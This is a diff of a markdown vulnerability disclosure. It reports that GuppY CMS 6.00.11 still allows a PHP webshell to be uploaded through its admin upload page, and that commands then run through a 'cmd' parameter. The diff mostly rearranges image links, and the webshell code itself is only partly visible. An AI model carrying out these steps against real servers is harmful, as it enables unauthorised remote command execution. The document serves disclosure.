@@ -5,13 +5,11 @@ In previous version (6.00.10), this CMS is vulnerable to RCE vulnerability via u
 
 It's said that, the vulnerability has been fixed in version 6.00.11. However, after testing, I found out that, I can still upload the PHP file, and execute command via the uploaded webshell.
 
-![](https://hackmd.io/_uploads/HJby18jSh.png)
-> GuppY version 6.00.11
-
-![](https://hackmd.io/_uploads/SJmOx8iHn.png)
+> ![image](assets/0.png)GuppY version 6.00.11
 
 Access the path: `http://localhost/guppy/admin/admin.php?lng=en&pg=upload`
 Upload the PHP webshell.
+
 ```php
 <html>
 <body>
@@ -31,8 +29,10 @@ Upload the PHP webshell.
 </html>
 ```
 
-![](https://hackmd.io/_uploads/r11qgUoHh.png)
+![image](assets/1.png)Access the uploaded file, and execute command via `cmd` parameter.
 
-![](https://hackmd.io/_uploads/H1jKArsH3.png)
-Access the uploaded file, and execute command via `cmd` parameter.
+![image](assets/2.png)
+
 View the response and confirm that the command is executed.
+
+![image](assets/3.png)
